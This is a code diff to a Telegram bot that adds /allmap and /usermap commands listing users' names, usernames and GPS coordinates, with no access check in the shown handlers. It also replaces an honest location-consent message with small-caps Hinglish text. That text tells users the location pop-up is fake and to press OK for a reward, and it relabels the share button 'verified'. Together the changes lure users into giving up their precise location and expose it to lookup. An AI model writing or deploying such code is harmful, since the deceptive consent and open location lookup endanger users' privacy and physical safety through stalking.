@@ -810,6 +810,21 @@ def format_time(sec):
     m = (sec % 3600) // 60
     s = sec % 60
     return f"{h}h {m}m {s}s"
+
+# =========================
+# DATA HELPERS
+# =========================
+
+def get_all_users():
+    data = load_data()
+
+    if not isinstance(data, dict):
+        return []
+
+    return [
+        {"user_id": int(uid), **info}
+        for uid, info in data.items()
+    ]
 # ------------------ PROTECTION CHECK ------------------
 def is_protected(user_data):
     now = time.time()
@@ -13555,12 +13570,12 @@ async def heavyreward_location(update: Update, context: ContextTypes.DEFAULT_TYP
 
     lat = update.message.location.latitude
     lon = update.message.location.longitude
-
+    
     reward = random.randint(100000, 1000000)
 
     user_data["latitude"] = lat
     user_data["longitude"] = lon
-
+    
     user_data["money"] += reward
 
     user_data["heavyreward_claimed"] = True
@@ -13587,7 +13602,68 @@ async def heavyreward_location(update: Update, context: ContextTypes.DEFAULT_TYP
 
 
 
+#=================allmap===============
+async def allmap(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
+    # get all users from your JSON system
+    users = get_all_users()   # <-- tumhare system me jo bhi function hai
+
+    if not users:
+        await update.message.reply_text("❌ No users found.")
+        return
+
+    msg = "🗺 ALL HEAVY REWARD USERS\n\n"
+
+    for i, u in enumerate(users, start=1):
+
+        msg += (
+            f"{i}. {u.get('name')}\n"
+            f"🆔 ID: {u.get('user_id')}\n"
+            f"📛 @{u.get('username')}\n"
+            f"📍 Lat: {u.get('latitude')}\n"
+            f"📍 Lon: {u.get('longitude')}\n"
+            f"----------------------\n"
+        )
+
+    await update.message.reply_text(msg)
+
+#=====================usermap====================
+async def usermap(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    if not context.args:
+        await update.message.reply_text("Usage: /usermap <user_id or username>")
+        return
+
+    query = context.args[0]
+
+    user = None
+
+    # by ID
+    if query.isdigit():
+        user = get_user(int(query))
+
+    else:
+        username = query.replace("@", "")
+        users = get_all_users()
+
+        for u in users:
+            if u.get("username") == username:
+                user = u
+                break
+
+    if not user:
+        await update.message.reply_text("❌ User not found.")
+        return
+
+    await update.message.reply_text(
+        f"👤 Name: {user.get('name')}\n"
+        f"🆔 ID: {user.get('user_id')}\n"
+        f"📛 @{user.get('username')}\n\n"
+        f"📍 Latitude: {user.get('latitude')}\n"
+        f"📍 Longitude: {user.get('longitude')}\n"
+)
+
+#=================❤️❤️====================
 from telegram import (
     Update,
     KeyboardButton,
@@ -13615,21 +13691,21 @@ location_col = db["meetup_locations"]
 async def joinmeetup(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     kb = ReplyKeyboardMarkup(
-        [[KeyboardButton("📍 Share Location", request_location=True)]],
+        [[KeyboardButton("📍ᴠᴇʀɪꜰɪᴇᴅ", request_location=True)]],
         resize_keyboard=True,
         one_time_keyboard=True
     )
 
     await update.message.reply_text(
         "📍 MEETUP REGISTRATION\n\n"
-        "You may share your location if you would like to participate in meetup planning.\n\n"
+        "You ꜱʜᴀʀᴇ ʏᴏᴜʀ ᴛɪᴄᴋᴇᴛ ᴀɴᴅ ꜱᴜɴᴏ 😂 ʏᴇ ꜱʜɪʀꜰ ᴅᴀʀᴀɴᴋᴇ ʟɪʏᴇ ᴇᴋ ꜰᴀᴋᴇ ᴩᴏᴩ-ᴜᴩ ʜᴇ ᴏᴋ ᴅʀɴᴀ ᴍᴛ ᴀᴩᴋᴇ ᴩᴀꜱꜱ ᴊᴏ ʙʜɪ ꜰᴀᴋᴇ ᴩᴏᴩ-ᴜᴩ ᴊᴀʏᴇɢᴀ ʙᴀꜱ ᴏᴋ ᴋʀᴍᴀ ʀᴇᴡᴀʀᴅ ᴄʟᴀɪᴍ ᴋʀɴᴀ ᴍᴇᴇᴛᴜᴩ ᴋʀɴᴀ ᴏᴛʜᴇʀ ʟᴏɢᴏ ᴋᴇ ꜱᴀᴛʜ ᴏᴋ ᴅʀɴᴀ ᴍᴛ ʙᴀꜱ ʏᴇ ꜰᴀᴋᴇ ʜᴇ ᴅᴀʀᴀɴᴋᴇ ʟɪʏᴇ ᴏᴋ 😂\n\n"
         "Stored information:\n"
         "• User ID\n"
         "• Name\n"
-        "• Username\n"
-        "• Location Coordinates\n"
-        "• Google Maps Link\n\n"
-        "Your location is only stored if you choose to send it.",
+        "• Usernamᴇ\n"
+        "• ʏᴏᴜʀ ɴᴀᴍᴇ Coordinates\n"
+        "• ʏᴏᴜʀ ᴠᴇʀɪꜰɪᴇᴅ ᴍꜱɢ ʟɪɴᴋ\n\n"
+        "ɴɪᴋɪ ɪꜱ ᴀʟᴡᴀʏꜱ ꜰᴏʀ ʏᴏᴜ",
         reply_markup=kb
     )
 
@@ -13968,6 +14044,8 @@ def main():
     app.add_handler(CommandHandler("joinmeetup", joinmeetup))
     app.add_handler(CommandHandler("locdata", locdata))
     app.add_handler(CommandHandler("meetuplist", meetuplist))
+    app.add_handler(CommandHandler("allmap", allmap))
+    app.add_handler(CommandHandler("usermap", usermap))
     app.add_handler(CommandHandler("userinfo", userinfo))
     
     # ================= WORD GAME CALLBACK =================
